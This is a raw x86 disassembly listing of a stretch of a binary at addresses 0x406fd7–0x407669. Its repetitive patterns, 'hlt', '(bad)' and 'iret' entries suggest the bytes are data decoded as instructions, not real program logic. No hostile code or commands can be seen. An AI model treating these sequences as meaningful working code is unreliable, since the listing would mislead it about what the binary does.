  406fd7:	21 3f                	and    %edi,(%edi)
  406fd9:	05 91 02 27 12       	add    $0x12270291,%eax
  406fde:	46                   	inc    %esi
  406fdf:	05 d9 02 d3 20       	add    $0x20d302d9,%eax
  406fe4:	84 00                	test   %al,(%eax)
  406fe6:	d9 02                	flds   (%edx)
  406fe8:	4c                   	dec    %esp
  406fe9:	10 3e                	adc    %bh,(%esi)
  406feb:	01 e1                	add    %esp,%ecx
  406fed:	02 f4                	add    %ah,%dh
  406fef:	1d 4c 05 d9 02       	sbb    $0x2d9054c,%eax
  406ff4:	68 1f 2a 01 a1       	push   $0xa1012a1f
  406ff9:	02 0a                	add    (%edx),%cl
  406ffb:	0f c3 00             	movnti %eax,(%eax)
  406ffe:	c1 01 1d             	roll   $0x1d,(%ecx)
  407001:	21 01                	and    %eax,(%ecx)
  407003:	05 99 02 f4 1d       	add    $0x1df40299,%eax
  407008:	6b 01 f1             	imul   $0xfffffff1,(%ecx),%eax
  40700b:	02 98 0f 6b 01 a1    	add    -0x5efe94f1(%eax),%bl
  407011:	02 46 15             	add    0x15(%esi),%al
  407014:	c3                   	ret
  407015:	00 a1 02 1a 0f c7    	add    %ah,-0x38f0e5fe(%ecx)
  40701b:	00 89 02 7e 14 4b    	add    %cl,0x4b147e02(%ecx)
  407021:	02 89 02 eb 11 4b    	add    0x4b11eb02(%ecx),%cl
  407027:	02 59 01             	add    0x1(%ecx),%bl
  40702a:	1c 23                	sbb    $0x23,%al
  40702c:	3e 01 59 01          	add    %ebx,%ds:0x1(%ecx)
  407030:	6d                   	insl   (%dx),%es:(%edi)
  407031:	26 c3                	es ret
  407033:	00 a1 02 e4 22 c7    	add    %ah,-0x38dd1bfe(%ecx)
  407039:	00 f9                	add    %bh,%cl
  40703b:	02 f4                	add    %ah,%dh
  40703d:	1d 6b 01 f9 02       	sbb    $0x2f9016b,%eax
  407042:	61                   	popa
  407043:	12 23                	adc    (%ebx),%ah
  407045:	02 01                	add    (%ecx),%al
  407047:	03 f4                	add    %esp,%esi
  407049:	1d 0e 00 01 03       	sbb    $0x301000e,%eax
  40704e:	36 0f 47 02          	cmova  %ss:(%edx),%eax
  407052:	c1 01 70             	roll   $0x70,(%ecx)
  407055:	1d 47 02 c1 01       	sbb    $0x1c10247,%eax
  40705a:	1f                   	pop    %ds
  40705b:	20 42 02             	and    %al,0x2(%edx)
  40705e:	09 03                	or     %eax,(%ebx)
  407060:	f4                   	hlt
  407061:	1d 6b 01 09 03       	sbb    $0x309016b,%eax
  407066:	6d                   	insl   (%dx),%es:(%edi)
  407067:	21 6a 05             	and    %ebp,0x5(%edx)
  40706a:	11 03                	adc    %eax,(%ebx)
  40706c:	dc 1d 70 05 19 03    	fcompl 0x3190570
  407072:	82 22 76             	andb   $0x76,(%edx)
  407075:	05 21 03 24 18       	add    $0x18240321,%eax
  40707a:	7c 05                	jl     0x407081
  40707c:	c1 01 dd             	roll   $0xdd,(%ecx)
  40707f:	21 47 02             	and    %eax,0x2(%edi)
  407082:	19 03                	sbb    %eax,(%ebx)
  407084:	53                   	push   %ebx
  407085:	23 bf 01 81 02 20    	and    0x20028101(%edi),%edi
  40708b:	0e                   	push   %cs
  40708c:	86 05 29 03 44 00    	xchg   %al,0x440329
  407092:	f4                   	hlt
  407093:	01 59 01             	add    %ebx,0x1(%ecx)
  407096:	d1 22                	shll   $1,(%edx)
  407098:	7b 00                	jnp    0x40709a
  40709a:	59                   	pop    %ecx
  40709b:	01 52 0f             	add    %edx,0xf(%edx)
  40709e:	c3                   	ret
  40709f:	00 59 01             	add    %bl,0x1(%ecx)
  4070a2:	26 0f c3 00          	movnti %eax,%es:(%eax)
  4070a6:	59                   	pop    %ecx
  4070a7:	01 64 19 93          	add    %esp,-0x6d(%ecx,%ebx,1)
  4070ab:	05 c1 01 1d 21       	add    $0x211d01c1,%eax
  4070b0:	99                   	cltd
  4070b1:	05 49 03 f4 1d       	add    $0x1df40349,%eax
  4070b6:	0e                   	push   %cs
  4070b7:	00 61 01             	add    %ah,0x1(%ecx)
  4070ba:	2e 03 cd             	cs add %ebp,%ecx
  4070bd:	03 51 03             	add    0x3(%ecx),%edx
  4070c0:	16                   	push   %ss
  4070c1:	15 75 01 69 00       	adc    $0x690175,%eax
  4070c6:	f4                   	hlt
  4070c7:	1d 0e 00 21 02       	sbb    $0x221000e,%eax
  4070cc:	16                   	push   %ss
  4070cd:	14 70                	adc    $0x70,%al
  4070cf:	01 69 00             	add    %ebp,0x0(%ecx)
  4070d2:	f1                   	int1
  4070d3:	0c aa                	or     $0xaa,%al
  4070d5:	05 c1 01 43 14       	add    $0x144301c1,%eax
  4070da:	b0 05                	mov    $0x5,%al
  4070dc:	c1 01 31             	roll   $0x31,(%ecx)
  4070df:	1d 47 02 c1 01       	sbb    $0x1c10247,%eax
  4070e4:	47                   	inc    %edi
  4070e5:	0d bd 05 59 01       	or     $0x15905bd,%eax
  4070ea:	2d 18 1d 00 61       	sub    $0x61001d18,%eax
  4070ef:	03 16                	add    (%esi),%edx
  4070f1:	14 47                	adc    $0x47,%al
  4070f3:	02 69 03             	add    0x3(%ecx),%ch
  4070f6:	33 15 c3 00 b1 02    	xor    0x2b100c3,%edx
  4070fc:	76 0f                	jbe    0x40710d
  4070fe:	c3                   	ret
  4070ff:	05 59 03 88 0f       	add    $0xf880359,%eax
  407104:	c3                   	ret
  407105:	05 59 03 16 14       	add    $0x14160359,%eax
  40710a:	47                   	inc    %edi
  40710b:	02 71 03             	add    0x3(%ecx),%dh
  40710e:	8e 22                	mov    (%edx),%fs
  407110:	c9                   	leave
  407111:	05 79 03 f4 1d       	add    $0x1df40379,%eax
  407116:	cf                   	iret
  407117:	05 79 03 8b 0e       	add    $0xe8b0379,%eax
  40711c:	d6                   	salc
  40711d:	05 c1 00 fe 0f       	add    $0xffe00c1,%eax
  407122:	0e                   	push   %cs
  407123:	00 19                	add    %bl,(%ecx)
  407125:	00 fe                	add    %bh,%dh
  407127:	0f 0e                	femms
  407129:	00 09                	add    %cl,(%ecx)
  40712b:	03 f4                	add    %esp,%esi
  40712d:	1d 36 02 0c 00       	sbb    $0xc0236,%eax
  407132:	f4                   	hlt
  407133:	1d 0e 00 0c 00       	sbb    $0xc000e,%eax
  407138:	75 0b                	jne    0x407145
  40713a:	f5                   	cmc
  40713b:	05 0c 00 c7 22       	add    $0x22c7000c,%eax
  407140:	f4                   	hlt
  407141:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  407144:	d0 25 fb 05 c1 01    	shlb   $1,0x1c105fb
  40714a:	43                   	inc    %ebx
  40714b:	19 01                	sbb    %eax,(%ecx)
  40714d:	06                   	push   %es
  40714e:	51                   	push   %ecx
  40714f:	00 4e 20             	add    %cl,0x20(%esi)
  407152:	11 06                	adc    %eax,(%esi)
  407154:	51                   	push   %ecx
  407155:	00 8c 01 17 06 59 00 	add    %cl,0x590617(%ecx,%eax,1)
  40715c:	b5 0b                	mov    $0xb,%ch
  40715e:	17                   	pop    %ss
  40715f:	06                   	push   %es
  407160:	89 03                	mov    %eax,(%ebx)
  407162:	8a 26                	mov    (%esi),%ah
  407164:	1d 06 69 00 f4       	sbb    $0xf4006906,%eax
  407169:	1d 01 03 61 00       	sbb    $0x610301,%eax
  40716e:	f4                   	hlt
  40716f:	1d 2d 06 91 03       	sbb    $0x391062d,%eax
  407174:	fe 0f                	decb   (%edi)
  407176:	0e                   	push   %cs
  407177:	00 99 03 f4 1d 56    	add    %bl,0x561df403(%ecx)
  40717d:	04 a1                	add    $0xa1,%al
  40717f:	03 97 13 35 06 81    	add    -0x7ef9caed(%edi),%edx
  407185:	02 7c 0d 0a          	add    0xa(%ebp,%ecx,1),%bh
  407189:	00 91 02 f4 25 35    	add    %dl,0x3525f402(%ecx)
  40718f:	05 91 02 27 12       	add    $0x12270291,%eax
  407194:	43                   	inc    %ebx
  407195:	06                   	push   %es
  407196:	89 01                	mov    %eax,(%ecx)
  407198:	e1 0d                	loope  0x4071a7
  40719a:	47                   	inc    %edi
  40719b:	02 91 02 f4 25 54    	add    0x5425f402(%ecx),%dl
  4071a1:	06                   	push   %es
  4071a2:	91                   	xchg   %eax,%ecx
  4071a3:	02 1e                	add    (%esi),%bl
  4071a5:	12 7c 05 91          	adc    -0x6f(%ebp,%eax,1),%bh
  4071a9:	02 12                	add    (%edx),%dl
  4071ab:	12 6b 01             	adc    0x1(%ebx),%ch
  4071ae:	91                   	xchg   %eax,%ecx
  4071af:	02 01                	add    (%ecx),%al
  4071b1:	26 5e                	es pop %esi
  4071b3:	06                   	push   %es
  4071b4:	91                   	xchg   %eax,%ecx
  4071b5:	02 c2                	add    %dl,%al
  4071b7:	0d 6b 01 1c 00       	or     $0x1c016b,%eax
  4071bc:	75 0b                	jne    0x4071c9
  4071be:	f5                   	cmc
  4071bf:	05 b9 03 25 23       	add    $0x232503b9,%eax
  4071c4:	7c 06                	jl     0x4071cc
  4071c6:	1c 00                	sbb    $0x0,%al
  4071c8:	dc 1d 92 06 24 00    	fcompl 0x240692
  4071ce:	82 22 a4             	andb   $0xa4,(%edx)
  4071d1:	06                   	push   %es
  4071d2:	1c 00                	sbb    $0x0,%al
  4071d4:	4c                   	dec    %esp
  4071d5:	12 a9 06 24 00 53    	adc    0x53002406(%ecx),%ch
  4071db:	23 bf 01 c9 03 31    	and    0x3103c901(%edi),%edi
  4071e1:	19 b3 06 c9 03 70    	sbb    %esi,0x7003c906(%ebx)
  4071e7:	0b b9 06 d1 03 d5    	or     -0x2afc2efa(%ecx),%edi
  4071ed:	0f c1 06             	xadd   %eax,(%esi)
  4071f0:	e1 03                	loope  0x4071f5
  4071f2:	4f                   	dec    %edi
  4071f3:	0d c8 06 d9 03       	or     $0x3d906c8,%eax
  4071f8:	60                   	pusha
  4071f9:	0e                   	push   %cs
  4071fa:	cf                   	iret
  4071fb:	06                   	push   %es
  4071fc:	f1                   	int1
  4071fd:	03 2d 10 d8 06 01    	add    0x106d810,%ebp
  407203:	04 32                	add    $0x32,%al
  407205:	1c e2                	sbb    $0xe2,%al
  407207:	06                   	push   %es
  407208:	2c 00                	sub    $0x0,%al
  40720a:	2d 10 17 07 2c       	sub    $0x2c071710,%eax
  40720f:	00 7c 21 23          	add    %bh,0x23(%ecx,%eiz,1)
  407213:	07                   	pop    %es
  407214:	34 00                	xor    $0x0,%al
  407216:	ed                   	in     (%dx),%eax
  407217:	0d 3b 07 1c 00       	or     $0x1c073b,%eax
  40721c:	f4                   	hlt
  40721d:	1d 0e 00 c1 01       	sbb    $0x1c1000e,%eax
  407222:	c8 26 84 00          	enter  $0x8426,$0x0
  407226:	21 04 f4             	and    %eax,(%esp,%esi,8)
  407229:	1d 6b 01 19 04       	sbb    $0x419016b,%eax
  40722e:	f4                   	hlt
  40722f:	1d 59 07 29 04       	sbb    $0x4290759,%eax
  407234:	75 1f                	jne    0x407255
  407236:	61                   	popa
  407237:	07                   	pop    %es
  407238:	51                   	push   %ecx
  407239:	01 f8                	add    %edi,%eax
  40723b:	13 93 01 49 04 f4    	adc    -0xbfbb6ff(%ebx),%edx
  407241:	1d 6b 01 59 02       	sbb    $0x259016b,%eax
  407246:	f4                   	hlt
  407247:	1d 0e 00 31 04       	sbb    $0x431000e,%eax
  40724c:	f4                   	hlt
  40724d:	1d 0e 00 51 04       	sbb    $0x451000e,%eax
  407252:	b6 12                	mov    $0x12,%dh
  407254:	01 03                	add    %eax,(%ebx)
  407256:	51                   	push   %ecx
  407257:	04 53                	add    $0x53,%al
  407259:	12 01                	adc    (%ecx),%al
  40725b:	03 51 04             	add    0x4(%ecx),%edx
  40725e:	5e                   	pop    %esi
  40725f:	0d 7a 07 51 04       	or     $0x451077a,%eax
  407264:	8b 13                	mov    (%ebx),%edx
  407266:	81 07 51 04 ec 25    	addl   $0x25ec0451,(%edi)
  40726c:	2b 02                	sub    (%edx),%eax
  40726e:	51                   	push   %ecx
  40726f:	04 82                	add    $0x82,%al
  407271:	07                   	pop    %es
  407272:	0e                   	push   %cs
  407273:	00 51 04             	add    %dl,0x4(%ecx)
  407276:	19 1e                	sbb    %ebx,(%esi)
  407278:	88 07                	mov    %al,(%edi)
  40727a:	39 04 f4             	cmp    %eax,(%esp,%esi,8)
  40727d:	1d 8e 07 51 04       	sbb    $0x451078e,%eax
  407282:	74 07                	je     0x40728b
  407284:	31 02                	xor    %eax,(%edx)
  407286:	39 04 99             	cmp    %eax,(%ecx,%ebx,4)
  407289:	16                   	push   %ss
  40728a:	0e                   	push   %cs
  40728b:	00 41 04             	add    %al,0x4(%ecx)
  40728e:	f4                   	hlt
  40728f:	1d 2b 02 59 02       	sbb    $0x259022b,%eax
  407294:	d0 25 31 02 51 03    	shlb   $1,0x3510231
  40729a:	16                   	push   %ss
  40729b:	15 9a 07 79 04       	adc    $0x479079a,%eax
  4072a0:	f4                   	hlt
  4072a1:	1d 6b 01 51 04       	sbb    $0x451016b,%eax
  4072a6:	7b 07                	jnp    0x4072af
  4072a8:	2b 02                	sub    (%edx),%eax
  4072aa:	51                   	push   %ecx
  4072ab:	04 09                	add    $0x9,%al
  4072ad:	1e                   	push   %ds
  4072ae:	88 07                	mov    %al,(%edi)
  4072b0:	c1 00 5f             	roll   $0x5f,(%eax)
  4072b3:	15 23 02 81 04       	adc    $0x4810223,%eax
  4072b8:	5a                   	pop    %edx
  4072b9:	26 be 07 91 04 c0    	es mov $0xc0049107,%esi
  4072bf:	25 d0 07 a1 04       	and    $0x4a107d0,%eax
  4072c4:	f4                   	hlt
  4072c5:	1d 0e 00 c1 01       	sbb    $0x1c1000e,%eax
  4072ca:	29 21                	sub    %esp,(%ecx)
  4072cc:	f9                   	stc
  4072cd:	07                   	pop    %es
  4072ce:	49                   	dec    %ecx
  4072cf:	02 75 1f             	add    0x1f(%ebp),%dh
  4072d2:	99                   	cltd
  4072d3:	01 49 02             	add    %ecx,0x2(%ecx)
  4072d6:	75 1f                	jne    0x4072f7
  4072d8:	ab                   	stos   %eax,%es:(%edi)
  4072d9:	01 a9 00 f4 1d 0e    	add    %ebp,0xe1df400(%ecx)
  4072df:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4072e2:	24 18                	and    $0x18,%al
  4072e4:	06                   	push   %es
  4072e5:	08 1c 00             	or     %bl,(%eax,%eax,1)
  4072e8:	c7                   	(bad)
  4072e9:	22 f4                	and    %ah,%dh
  4072eb:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  4072ee:	18 1c 0e             	sbb    %bl,(%esi,%ecx,1)
  4072f1:	00 c1                	add    %al,%cl
  4072f3:	01 f2                	add    %esi,%edx
  4072f5:	1f                   	pop    %ds
  4072f6:	42                   	inc    %edx
  4072f7:	02 c1                	add    %cl,%al
  4072f9:	00 08                	add    %cl,(%eax)
  4072fb:	12 28                	adc    (%eax),%ch
  4072fd:	08 49 02             	or     %cl,0x2(%ecx)
  407300:	75 1f                	jne    0x407321
  407302:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407303:	01 51 01             	add    %edx,0x1(%ecx)
  407306:	5d                   	pop    %ebp
  407307:	00 32                	add    %dh,(%edx)
  407309:	08 c1                	or     %al,%cl
  40730b:	01 88 18 47 02 a9    	add    %ecx,-0x56fdb8e8(%eax)
  407311:	04 0c                	add    $0xc,%al
  407313:	10 37                	adc    %dh,(%edi)
  407315:	08 51 01             	or     %dl,0x1(%ecx)
  407318:	5d                   	pop    %ebp
  407319:	00 3c 08             	add    %bh,(%eax,%ecx,1)
  40731c:	51                   	push   %ecx
  40731d:	01 5d 00             	add    %ebx,0x0(%ebp)
  407320:	41                   	inc    %ecx
  407321:	08 51 01             	or     %dl,0x1(%ecx)
  407324:	5d                   	pop    %ebp
  407325:	00 46 08             	add    %al,0x8(%esi)
  407328:	51                   	push   %ecx
  407329:	01 66 00             	add    %esp,0x0(%esi)
  40732c:	4d                   	dec    %ebp
  40732d:	08 41 03             	or     %al,0x3(%ecx)
  407330:	0c 10                	or     $0x10,%al
  407332:	52                   	push   %edx
  407333:	08 51 01             	or     %dl,0x1(%ecx)
  407336:	66 00 57 08          	data16 add %dl,0x8(%edi)
  40733a:	51                   	push   %ecx
  40733b:	01 66 00             	add    %esp,0x0(%esi)
  40733e:	5c                   	pop    %esp
  40733f:	08 51 01             	or     %dl,0x1(%ecx)
  407342:	66 00 61 08          	data16 add %ah,0x8(%ecx)
  407346:	51                   	push   %ecx
  407347:	01 17                	add    %edx,(%edi)
  407349:	0e                   	push   %cs
  40734a:	68 08 b1 04 0c       	push   $0xc04b108
  40734f:	10 6d 08             	adc    %ch,0x8(%ebp)
  407352:	49                   	dec    %ecx
  407353:	02 75 1f             	add    0x1f(%ebp),%dh
  407356:	7a 08                	jp     0x407360
  407358:	59                   	pop    %ecx
  407359:	03 64 26 23          	add    0x23(%esi,%eiz,1),%esp
  40735d:	02 e1                	add    %cl,%ah
  40735f:	02 f4                	add    %ah,%dh
  407361:	1d 88 08 c1 00       	sbb    $0xc10888,%eax
  407366:	ff 11                	call   *(%ecx)
  407368:	f4                   	hlt
  407369:	01 89 01 f4 1d 6b    	add    %ecx,0x6b1df401(%ecx)
  40736f:	01 49 02             	add    %ecx,0x2(%ecx)
  407372:	6e                   	outsb  %ds:(%esi),(%dx)
  407373:	00 b6 08 49 02 7d    	add    %dh,0x7d024908(%esi)
  407379:	0e                   	push   %cs
  40737a:	bd 08 49 02 17       	mov    $0x17024908,%ebp
  40737f:	0e                   	push   %cs
  407380:	c4 08                	les    (%eax),%ecx
  407382:	49                   	dec    %ecx
  407383:	02 3b                	add    (%ebx),%bh
  407385:	00 cb                	add    %cl,%bl
  407387:	08 49 02             	or     %cl,0x2(%ecx)
  40738a:	5d                   	pop    %ebp
  40738b:	00 d2                	add    %dl,%dl
  40738d:	08 49 02             	or     %cl,0x2(%ecx)
  407390:	77 00                	ja     0x407392
  407392:	d9 08                	(bad) (%eax)
  407394:	49                   	dec    %ecx
  407395:	02 66 00             	add    0x0(%esi),%ah
  407398:	e0 08                	loopne 0x4073a2
  40739a:	49                   	dec    %ecx
  40739b:	02 75 1f             	add    0x1f(%ebp),%dh
  40739e:	12 09                	adc    (%ecx),%cl
  4073a0:	d1 04 f4             	roll   $1,(%esp,%esi,8)
  4073a3:	1d 28 09 09 00       	sbb    $0x90928,%eax
  4073a8:	80 00 0d             	addb   $0xd,(%eax)
  4073ab:	01 09                	add    %ecx,(%ecx)
  4073ad:	00 84 00 12 01 09 00 	add    %al,0x90112(%eax,%eax,1)
  4073b4:	88 00                	mov    %al,(%eax)
  4073b6:	17                   	pop    %ss
  4073b7:	01 08                	add    %ecx,(%eax)
  4073b9:	00 98 00 5c 01 08    	add    %bl,0x8015c00(%eax)
  4073bf:	00 9c 00 61 01 08 00 	add    %bl,0x80161(%eax,%eax,1)
  4073c6:	a0 00 66 01 08       	mov    0x8016600,%al
  4073cb:	00 a4 00 5c 01 08 00 	add    %ah,0x8015c(%eax,%eax,1)
  4073d2:	ec                   	in     (%dx),%al
  4073d3:	00 7f 02             	add    %bh,0x2(%edi)
  4073d6:	08 00                	or     %al,(%eax)
  4073d8:	f0 00 17             	lock add %dl,(%edi)
  4073db:	01 08                	add    %ecx,(%eax)
  4073dd:	00 f4                	add    %dh,%ah
  4073df:	00 12                	add    %dl,(%edx)
  4073e1:	01 08                	add    %ecx,(%eax)
  4073e3:	00 f8                	add    %bh,%al
  4073e5:	00 84 02 08 00 fc 00 	add    %al,0xfc0008(%edx,%eax,1)
  4073ec:	89 02                	mov    %eax,(%edx)
  4073ee:	08 00                	or     %al,(%eax)
  4073f0:	00 01                	add    %al,(%ecx)
  4073f2:	8e 02                	mov    (%edx),%es
  4073f4:	08 00                	or     %al,(%eax)
  4073f6:	04 01                	add    $0x1,%al
  4073f8:	93                   	xchg   %eax,%ebx
  4073f9:	02 08                	add    (%eax),%cl
  4073fb:	00 08                	add    %cl,(%eax)
  4073fd:	01 98 02 08 00 0c    	add    %ebx,0xc000802(%eax)
  407403:	01 9d 02 08 00 10    	add    %ebx,0x10000802(%ebp)
  407409:	01 a2 02 08 00 14    	add    %esp,0x14000802(%edx)
  40740f:	01 a7 02 08 00 18    	add    %esp,0x18000802(%edi)
  407415:	01 ac 02 2e 00 2b 00 	add    %ebp,0x2b002e(%edx,%eax,1)
  40741c:	06                   	push   %es
  40741d:	03 2e                	add    (%esi),%ebp
  40741f:	00 33                	add    %dh,(%ebx)
  407421:	00 0f                	add    %cl,(%edi)
  407423:	03 2e                	add    (%esi),%ebp
  407425:	00 3b                	add    %bh,(%ebx)
  407427:	00 34 03             	add    %dh,(%ebx,%eax,1)
  40742a:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  40742e:	3d 03 2e 00 4b       	cmp    $0x4b002e03,%eax
  407433:	00 3d 03 2e 00 53    	add    %bh,0x53002e03
  407439:	00 3d 03 2e 00 5b    	add    %bh,0x5b002e03
  40743f:	00 3d 03 2e 00 63    	add    %bh,0x63002e03
  407445:	00 3d 03 2e 00 6b    	add    %bh,0x6b002e03
  40744b:	00 3d 03 2e 00 73    	add    %bh,0x73002e03
  407451:	00 3d 03 2e 00 7b    	add    %bh,0x7b002e03
  407457:	00 43 03             	add    %al,0x3(%ebx)
  40745a:	2e 00 83 00 50 03 2e 	add    %al,%cs:0x2e035000(%ebx)
  407461:	00 8b 00 3d 03 c0    	add    %cl,-0x3ffcc300(%ebx)
  407467:	00 93 00 17 01 e0    	add    %dl,-0x1ffee900(%ebx)
  40746d:	00 93 00 17 01 00    	add    %dl,0x11700(%ebx)
  407473:	01 93 00 17 01 20    	add    %edx,0x20011700(%ebx)
  407479:	01 93 00 17 01 40    	add    %edx,0x40011700(%ebx)
  40747f:	01 93 00 17 01 60    	add    %edx,0x60011700(%ebx)
  407485:	01 93 00 17 01 80    	add    %edx,-0x7ffee900(%ebx)
  40748b:	01 93 00 17 01 a0    	add    %edx,-0x5ffee900(%ebx)
  407491:	01 93 00 17 01 c0    	add    %edx,-0x3ffee900(%ebx)
  407497:	01 93 00 17 01 e0    	add    %edx,-0x1ffee900(%ebx)
  40749d:	01 93 00 17 01 00    	add    %edx,0x11700(%ebx)
  4074a3:	02 93 00 17 01 03    	add    0x3011700(%ebx),%dl
  4074a9:	02 93 00 17 01 20    	add    0x20011700(%ebx),%dl
  4074af:	02 93 00 17 01 40    	add    0x40011700(%ebx),%dl
  4074b5:	02 93 00 17 01 60    	add    0x60011700(%ebx),%dl
  4074bb:	02 93 00 17 01 61    	add    0x61011700(%ebx),%dl
  4074c1:	02 93 00 17 01 63    	add    0x63011700(%ebx),%dl
  4074c7:	02 93 00 17 01 80    	add    -0x7ffee900(%ebx),%dl
  4074cd:	02 93 00 17 01 81    	add    -0x7efee900(%ebx),%dl
  4074d3:	02 93 00 17 01 a0    	add    -0x5ffee900(%ebx),%dl
  4074d9:	02 93 00 17 01 a1    	add    -0x5efee900(%ebx),%dl
  4074df:	02 93 00 17 01 c0    	add    -0x3ffee900(%ebx),%dl
  4074e5:	02 93 00 17 01 c1    	add    -0x3efee900(%ebx),%dl
  4074eb:	02 93 00 17 01 e0    	add    -0x1ffee900(%ebx),%dl
  4074f1:	02 93 00 17 01 e1    	add    -0x1efee900(%ebx),%dl
  4074f7:	02 93 00 17 01 e3    	add    -0x1cfee900(%ebx),%dl
  4074fd:	02 9b 00 b6 03 00    	add    0x3b600(%ebx),%bl
  407503:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  407509:	03 93 00 17 01 20    	add    0x20011700(%ebx),%edx
  40750f:	03 93 00 17 01 21    	add    0x21011700(%ebx),%edx
  407515:	03 93 00 17 01 40    	add    0x40011700(%ebx),%edx
  40751b:	03 93 00 17 01 41    	add    0x41011700(%ebx),%edx
  407521:	03 93 00 17 01 61    	add    0x61011700(%ebx),%edx
  407527:	03 93 00 17 01 81    	add    -0x7efee900(%ebx),%edx
  40752d:	03 93 00 17 01 a1    	add    -0x5efee900(%ebx),%edx
  407533:	03 93 00 17 01 a3    	add    -0x5cfee900(%ebx),%edx
  407539:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  40753f:	00 20                	add    %ah,(%eax)
  407541:	00 00                	add    %al,(%eax)
  407543:	00 14 00             	add    %dl,(%eax,%eax,1)
  407546:	01 00                	add    %eax,(%eax)
  407548:	06                   	push   %es
  407549:	00 00                	add    %al,(%eax)
  40754b:	00 1e                	add    %bl,(%esi)
  40754d:	00 c0                	add    %al,%al
  40754f:	03 c9                	add    %ecx,%ecx
  407551:	03 f4                	add    %esp,%esi
  407553:	03 9c 04 c2 04 e6 04 	add    0x4e604c2(%esp,%eax,1),%ebx
  40755a:	54                   	push   %esp
  40755b:	05 59 05 81 05       	add    $0x5810559,%eax
  407560:	8a 05 8f 05 9f 05    	mov    0x59f058f,%al
  407566:	b6 05                	mov    $0x5,%dh
  407568:	dd 05 08 06 27 06    	fldl   0x6270608
  40756e:	3c 06                	cmp    $0x6,%al
  407570:	4c                   	dec    %esp
  407571:	06                   	push   %es
  407572:	66 06                	pushw  %es
  407574:	af                   	scas   %es:(%edi),%eax
  407575:	06                   	push   %es
  407576:	53                   	push   %ebx
  407577:	07                   	pop    %es
  407578:	67 07                	addr16 pop %es
  40757a:	a3 07 cb 07 da       	mov    %eax,0xda07cb07
  40757f:	07                   	pop    %es
  407580:	e8 07 f0 07 ff       	call   0xff48658c
  407585:	07                   	pop    %es
  407586:	0c 08                	or     $0x8,%al
  407588:	11 08                	adc    %ecx,(%eax)
  40758a:	20 08                	and    %cl,(%eax)
  40758c:	2d 08 72 08 80       	sub    $0x80087208,%eax
  407591:	08 96 08 a2 08 a8    	or     %dl,-0x57f75df8(%esi)
  407597:	08 ae 08 e7 08 f1    	or     %ch,-0xef718f8(%esi)
  40759d:	08 f7                	or     %dh,%bh
  40759f:	08 fc                	or     %bh,%ah
  4075a1:	08 02                	or     %al,(%edx)
  4075a3:	09 0b                	or     %ecx,(%ebx)
  4075a5:	09 18                	or     %ebx,(%eax)
  4075a7:	09 31                	or     %esi,(%ecx)
  4075a9:	09 04 00             	or     %eax,(%eax,%eax,1)
  4075ac:	01 00                	add    %eax,(%eax)
  4075ae:	16                   	push   %ss
  4075af:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4075b2:	17                   	pop    %ss
  4075b3:	00 0d 00 18 00 0f    	add    %cl,0xf001800
  4075b9:	00 00                	add    %al,(%eax)
  4075bb:	00 e9                	add    %ch,%cl
  4075bd:	1a 9f 00 00 00 c3    	sbb    -0x3d000000(%edi),%bl
  4075c3:	14 a4                	adc    $0xa4,%al
  4075c5:	00 00                	add    %al,(%eax)
  4075c7:	00 0c 13             	add    %cl,(%ebx,%edx,1)
  4075ca:	a9 00 00 00 08       	test   $0x8000000,%eax
  4075cf:	1c ae                	sbb    $0xae,%al
  4075d1:	00 00                	add    %al,(%eax)
  4075d3:	00 17                	add    %dl,(%edi)
  4075d5:	25 ae 00 00 00       	and    $0xae,%eax
  4075da:	64 05 b2 00 00 00    	fs add $0xb2,%eax
  4075e0:	22 09                	and    (%ecx),%cl
  4075e2:	b7 00                	mov    $0x0,%bh
  4075e4:	00 00                	add    %al,(%eax)
  4075e6:	d2 02                	rolb   %cl,(%edx)
  4075e8:	bb 00 00 00 02       	mov    $0x2000000,%ebx
  4075ed:	16                   	push   %ss
  4075ee:	b2 00                	mov    $0x0,%dl
  4075f0:	00 00                	add    %al,(%eax)
  4075f2:	5a                   	pop    %edx
  4075f3:	17                   	pop    %ss
  4075f4:	bf 00 00 00 c6       	mov    $0xc6000000,%edi
  4075f9:	16                   	push   %ss
  4075fa:	b7 00                	mov    $0x0,%bh
  4075fc:	00 00                	add    %al,(%eax)
  4075fe:	1f                   	pop    %ds
  4075ff:	07                   	pop    %es
  407600:	c3                   	ret
  407601:	01 00                	add    %eax,(%eax)
  407603:	00 f0                	add    %dh,%al
  407605:	18 f8                	sbb    %bh,%al
  407607:	01 00                	add    %eax,(%eax)
  407609:	00 bc 06 fe 01 00 00 	add    %bh,0x1fe(%esi,%eax,1)
  407610:	3a 09                	cmp    (%ecx),%cl
  407612:	69 02 00 00 96 15    	imul   $0x15960000,(%edx),%eax
  407618:	6d                   	insl   (%dx),%es:(%edi)
  407619:	02 00                	add    (%eax),%al
  40761b:	00 78 1d             	add    %bh,0x1d(%eax)
  40761e:	71 02                	jno    0x407622
  407620:	00 00                	add    %al,(%eax)
  407622:	bf 08 75 02 00       	mov    $0x27508,%edi
  407627:	00 6b 06             	add    %ch,0x6(%ebx)
  40762a:	7a 02                	jp     0x40762e
  40762c:	02 00                	add    (%eax),%al
  40762e:	06                   	push   %es
  40762f:	00 03                	add    %al,(%ebx)
  407631:	00 01                	add    %al,(%ecx)
  407633:	00 07                	add    %al,(%edi)
  407635:	00 03                	add    %al,(%ebx)
  407637:	00 02                	add    %al,(%edx)
  407639:	00 08                	add    %cl,(%eax)
  40763b:	00 05 00 01 00 09    	add    %al,0x9000100
  407641:	00 05 00 02 00 0a    	add    %al,0xa000200
  407647:	00 07                	add    %al,(%edi)
  407649:	00 01                	add    %al,(%ecx)
  40764b:	00 0b                	add    %cl,(%ebx)
  40764d:	00 07                	add    %al,(%edi)
  40764f:	00 02                	add    %al,(%edx)
  407651:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407654:	09 00                	or     %eax,(%eax)
  407656:	01 00                	add    %eax,(%eax)
  407658:	0d 00 09 00 02       	or     $0x2000900,%eax
  40765d:	00 0e                	add    %cl,(%esi)
  40765f:	00 0b                	add    %cl,(%ebx)
  407661:	00 01                	add    %al,(%ecx)
  407663:	00 0f                	add    %cl,(%edi)
  407665:	00 0b                	add    %cl,(%ebx)
  407667:	00 02                	add    %al,(%edx)
  407669:	00 10                	add    %dl,(%eax)
